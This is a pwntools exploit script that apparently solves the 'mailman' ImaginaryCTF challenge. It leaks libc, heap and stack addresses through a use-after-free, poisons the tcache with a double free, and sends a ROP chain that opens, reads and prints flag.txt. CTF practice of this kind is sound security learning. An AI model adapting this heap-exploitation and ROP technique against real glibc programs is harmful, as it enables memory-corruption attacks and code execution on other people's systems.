#!/usr/bin/env python3



from pwn import *

e = ELF("./mailman")
#r = process("./mailman")
r = remote("mailman.chal.imaginaryctf.org",1337)
libc = ELF("./libc.so.6")

def malloc(index,size,content):
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b"idx:",f"{index}")
    r.sendlineafter(b"size:",f"{size}")
    r.sendlineafter(b"content:",content)

def free(index):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b"idx:",f"{index}")

def leak(index):
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"idx:",f"{index}")

malloc(0,0x458,b"AJAY")
malloc(1,0x178,b"AJAY")
malloc(1,0x198,b"AJAY")
for i in range(2,15):
    malloc(i,0x58,b"AJAY")
free(0)
leak(0)
libc_base = u64(r.recvline().strip().decode('latin-1').ljust(8,'\x00')) - 0x219ce0
log.info("The libc base of the process is " + hex(libc_base))
for i in range(2,15):
    free(i)
leak(2)
heap_base = (u64(r.recvline().strip().decode('latin-1').ljust(8,'\x00')) << 12 ) - 0x1000
log.info("The heap base of the process is " + hex(heap_base))
free(13)
free(14)
free(13)
for i in range(2,9):
    malloc(2,0x58,b"1" * 0x7)
for i in range(0,3):
    malloc(2,0x58,p64((heap_base + 0xb0) ^ ((heap_base >> 12)+2)))
malloc(2,0x58,p64(0) + p64(libc_base + 0x21a780) + p64(heap_base + 0xf0) * 8)
malloc(2,0x68,p64(0xfbad1800) + p64(0) + p64(libc_base + libc.sym.environ) + p64(0) + p64(libc_base + libc.sym.environ) + p64(libc_base + libc.sym.environ + 0x8) + p64(libc_base + libc.sym.environ + 0x8) + p64(heap_base + 0x2a0) + p64(heap_base + 0x2a0))
stack_leak = u64(r.recvuntil(b"\x7f").strip().decode('latin-1').ljust(8,'\x00'))
log.info("The stack leak of the process is " + hex(stack_leak))
malloc(1,0xc8,b"\x00" * 8 + p64(stack_leak - 0x188))
pop_rax = libc_base + 0x45eb0
pop_rdi = libc_base + 0x2a3e5
pop_rsi = libc_base + 0x1303b2
pop_rdx = libc_base + 0x90529
syscall = libc_base + 0x91396
xchg = libc_base + 0x14a385
exploit = b"./flag.txt\x00\x00\x00\x00\x00\x00" + b"\x00" * 24 +  p64(pop_rax) + p64(2) + p64(pop_rdi) + p64(stack_leak - 0x188) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) * 2 + p64(syscall) + p64(xchg) + p64(pop_rax) + p64(0) + p64(pop_rsi) + p64(stack_leak) + p64(pop_rdx) + p64(0x60) * 2 + p64(syscall) + p64(pop_rax) + p64(1) + p64(pop_rdi) + p64(1) + p64(syscall)
malloc(1,0xe8,exploit)
r.interactive()

